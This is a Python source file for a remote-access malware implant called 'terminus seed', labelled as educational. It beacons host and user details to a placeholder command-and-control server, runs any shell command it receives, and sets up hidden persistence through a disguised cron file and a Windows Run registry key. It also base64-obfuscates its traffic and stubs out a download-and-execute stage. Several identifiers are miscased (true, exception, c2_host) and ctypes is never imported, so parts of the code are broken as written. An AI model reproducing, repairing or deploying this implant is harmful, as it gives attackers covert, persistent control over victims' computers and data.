# file: terminus_seed.py
# version: 0.1.0 'ouroboros'
# author: [redacted]
# notice: for educational & research purposes only. seriously.

import os
import sys
import socket
import subprocess
import platform
import time
import random
import base64
import json

# --- c2 configuration ---
# in a real scenario, this would be a list of dozens of domains,
# some legitimate (like github gists, pastebin, discord cdn), some throwaway.
# the agent would cycle through them.
C2_HOST = 'your-c2-server.com'  # <-- this is where it calls home. you build this.
C2_PORT = 443  # use common ports to blend in with normal traffic.

# --- polymorphic engine (rudimentary) ---
# the real terminus would use advanced code-weaving and encryption.
# this is a simple obfuscation layer to demonstrate the principle.
def obfuscate_string(s):
    """encodes a string to look like garbage."""
    return base64.b64encode(s.encode()).decode()

def deobfuscate_string(s):
    """decodes the garbage back into a command."""
    return base64.b64decode(s.encode()).decode()

class TerminusSeed:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.platform = platform.system().lower()
        self.uid = self.get_unique_id()
        self.connection = None

    def get_unique_id(self):
        """generates a 'unique' id for the compromised host."""
        # a real agent uses hardware signatures (mac, cpu serial, etc.)
        # this is a cheap imitation.
        seed = f"{self.hostname}-{self.platform}-{os.getlogin()}".encode()
        return base64.b64encode(seed).decode().strip("=")

    def establish_persistence(self):
        """ensures the seed runs again after a reboot. this is the part that makes it a pest."""
        print("[*] establishing persistence...")
        loc = os.path.realpath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        try:
            if self.platform == "linux":
                # sneaky cron job. no crontab -l will see this easily.
                cron_job = f"@reboot python3 {loc}\n"
                # you'd hide this in a less obvious place.
                with open("/etc/cron.d/system-core-update", "w") as f:
                    f.write(cron_job)
            elif self.platform == "windows":
                # the classic run key.
                cmd = f'reg add "hkcu\\software\\microsoft\\windows\\currentversion\\run" /v "windows update service" /t reg_sz /d "python.exe {loc}" /f'
                subprocess.run(cmd, shell=true, capture_output=true)
            print("[+] persistence achieved.")
        except exception as e:
            print(f"[!] persistence failed: {e}") # probably no root/admin. amateur.

    def connect_to_c2(self):
        """phones home to the command & control server."""
        while true:
            try:
                print(f"[*] attempting to connect to c2 ({c2_host}:{c2_port})...")
                self.connection = socket.socket(socket.af_inet, socket.sock_stream)
                self.connection.connect((c2_host, c2_port))
                print("[+] connection established.")
                self.beacon()
                break
            except exception as e:
                print(f"[!] connection failed: {e}. retrying in 60s.")
                time.sleep(60)

    def beacon(self):
        """sends initial system info and awaits instructions."""
        sys_info = {
            'uid': self.uid,
            'hostname': self.hostname,
            'platform': self.platform,
            'user': os.getlogin(),
            'privs': 'admin' if os.geteuid() == 0 or ctypes.windll.shell32.isshelladmin() else 'user'
        }
        self.send_data(sys_info)
        self.command_loop()

    def send_data(self, data):
        """sends json data, obfuscated, to the c2."""
        serialized_data = json.dumps(data)
        obfuscated_data = obfuscate_string(serialized_data)
        self.connection.send(obfuscated_data.encode())

    def command_loop(self):
        """the main loop. receives commands, executes them, sends back results."""
        while true:
            try:
                # receive obfuscated command
                data = self.connection.recv(4096).decode()
                if not data: break

                # deobfuscate and execute
                command = deobfuscate_string(data)
                print(f"[*] received command: {command}")

                if command.lower() == 'terminate':
                    self.cleanup()
                    break
                
                if command.lower().startswith('download_exec'):
                    # this is where you'd download the next stage payload
                    # e.g., 'download_exec http://c2/payloads/scanner.exe'
                    pass # implementation left as an exercise for the damned

                # execute shell command
                output = subprocess.run(command, shell=true, capture_output=true, text=true)
                result = {
                    'stdout': output.stdout,
                    'stderr': output.stderr
                }
                self.send_data(result)

            except exception as e:
                error_msg = {'error': str(e)}
                self.send_data(error_msg)
                break
        
        self.connection.close()

    def cleanup(self):
        """self-destruct sequence. remove traces."""
        print("[*] terminate signal received. cleaning up...")
        # remove persistence, clear logs, delete self.
        # left as an exercise. a real agent doesn't leave a body.
        self.connection.close()
        # os.remove(__file__) # naive self-delete
        sys.exit(0)

if __name__ == '__main__':
    seed = terminusseed()
    # check for persistence. if not there, establish it.
    # seed.establish_persistence() # uncomment when you're ready to play for keeps.
    seed.connect_to_c2()
